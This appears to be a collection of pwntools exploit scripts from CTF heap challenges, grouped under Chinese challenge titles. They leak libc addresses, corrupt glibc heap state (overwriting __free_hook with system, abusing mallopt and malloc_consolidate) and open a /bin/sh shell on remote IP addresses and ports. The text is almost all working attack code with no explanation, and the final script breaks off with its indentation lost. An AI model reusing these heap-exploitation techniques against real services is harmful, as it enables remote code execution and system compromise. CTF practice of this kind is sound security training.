context.aslr = False 
def add(p, idx, data): 
    p.recvuntil(b'>>') 
    p.sendline(b'1') 
    p.recvuntil(b'tree index?') 
    p.sendline(str(idx)) 
    p.recvuntil(b'tree name?') 
    p.send(data) 
def remove(p, idx): 
    p.recvuntil(b'>>') 
    p.sendline(b'2') 
    p.recvuntil(b'tree index?') 
    p.sendline(str(idx)) 
def show(p, idx): 
    p.recvuntil(b'>>') 
    p.sendline(b'3') 
    p.recvuntil(b'tree index?\n') 
    p.sendline(str(idx)) 
def steal(p, idx): 
    p.recvuntil(b'>>') 
    p.sendline(b'5') 
    p.recvuntil(b'which tree do you want to steal?') 
    p.sendline(str(idx)) 
def malloc_0x20(p): 
    p.recvuntil(b'>>') 
    p.sendline(b'6') 
from docker_debug import * 
debug_env = DockerDebug('ubuntu-1904') 
attach = debug_env.attach 
process = debug_env.process 
def main(): 
    # program path in docker 
    libc = ELF('./libc-2.29.so', checksec=False) 
    #p = process('./garden') 
    p = remote('8.131.69.237', 32452) 
    for i in range(9): 
        add(p, i, str(i)*100) 
    for i in range(6): 
        remove(p, i) 
    remove(p, 8) 
    steal(p, 7) 
    show(p, 7) 
    libc_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) -  0x1e4ca0 
    log.success("libc_addr: 0x{:08x}".format(libc_addr)) 
    libc.address = libc_addr 
    remove(p, 6) 
    malloc_0x20(p) 
    for i in range(6): 
        add(p, i, str(i)*100) 
    add(p, 6, b'/bin/sh\x00') 
    add(p, 8, b'888') 
    for i in range(5): 
        remove(p, i) 
    remove(p, 7) 
    remove(p, 8) 
    add(p, 8, b'a'*0xe0 + p64(libc.sym['__free_hook'])) 
    add(p, 0, b'0000') 
    add(p, 1, p64(libc.sym['system'])) 
    remove(p, 6) 
    p.interactive() 
if __name__ == '__main__': 
    main() 
把嘴闭上 
from pwn import * 
context.terminal = ['tmux', 'splitw', '-h'] 
context.log_level = 'debug' 
context.aslr = False 
def fastbin(p, l, data): 
    p.recvuntil(' > ') 
    p.sendline('1') 
    p.recvuntil('?') 
    p.recvuntil(' > ') 
    p.sendline(str(l)) 
    p.recvuntil('?') 
    p.recvuntil(' > ') 
    p.send(data) 
def delete_buf(p): 
    p.recvuntil(' > ') 
    p.sendline('2') 
def malloc_opt(p, op, value): 
    p.recvuntil(' > ') 
    p.sendline('3') 
    p.recvuntil(b'\xbc\x9f') 
    p.recvuntil(' > ') 
    p.sendline(str(op)) 
    p.recvuntil(b'\xbc\x9f') 
    p.recvuntil(' > ') 
    p.sendline(str(value)) 
def malloc_buf(p, l, data): 
    p.recvuntil(' > ') 
    p.sendline('4') 
    p.recvuntil(b'?') 
    p.recvuntil(' > ') 
    p.sendline(str(l)) 
    p.recvuntil(b'?') 
    p.recvuntil(' > ') 
    p.send(data) 
M_TRIM_THRESHOLD = -1 
from docker_debug import * 
debug_env = DockerDebug('ubuntu-1604') 
process = debug_env.process 
attach = debug_env.attach 
def main(): 
    # program path in docker 
    libc = ELF('./libc-2.23.so', checksec=False) 
    #p = process('./ba_zui_bi_shang') 
    p = remote('112.126.71.170', 23548) 
    p.recvuntil(': ') 
    addr = int(p.recvuntil('\n', drop=True), 16) - libc.sym['puts'] 
    log.success('libc: 0x{:08x}'.format(addr)) 
    libc.address = addr 
    p.recvuntil('?') 
    p.recvuntil(' > ') 
    p.sendline(str(0x4ff)) 
    p.recvuntil('?') 
    p.recvuntil(' > ') 
    p.send(b'a'*0x4ff) 
    fastbin(p, 0x1f, b'aaaaa') 
    delete_buf(p) 
    malloc_opt(p, 1, 1) # 触发 malloc_consolidate 
    fastbin(p, 0x1f, b'aaaaa') # last_remainder 
    malloc_opt(p, -2, 1) 
    malloc_buf(p, 0x481, b'\x00') 
    malloc_buf(p, 0x401, b'\x00') 
    malloc_buf(p, 0x401, b'\x00') 
    malloc_buf(p, 0x4ff, b'\x00') 
    malloc_buf(p, 0x4ff, b'\x00') 
    malloc_buf(p, 0x4ff, b'\x00') 
    payload = b'/bin/sh\x00'.ljust(0x40, b'\x00') 
    payload += p64(libc.sym['system']) 
    malloc_buf(p, 0x4ff, payload) 
    delete_buf(p) 
    p.interactive() 
if __name__ == '__main__': 
    main() 
影流之主 
from pwn import * 
from time import sleep 
# s = process("./ying_liu_zhi_zhu") 
s = remote("112.126.71.170","45123") 
def add(): 
sleep(0.1) 
s.sendline("1") 
def free(idx): 
sleep(0.1) 
s.sendline("2") 
sleep(0.1) 
s.sendline(str(idx)) 
def edit(idx,buf): 
sleep(0.1) 
s.sendline("3") 
sleep(0.1) 
s.sendline(str(idx)) 
sleep(0.1) 
s.send(buf) 
def show(idx): 
sleep(0.1) 
s.sendline("4") 
sleep(0.1) 
s.sendline(str(idx)) 
def glob(pattern): 
sleep(0.1) 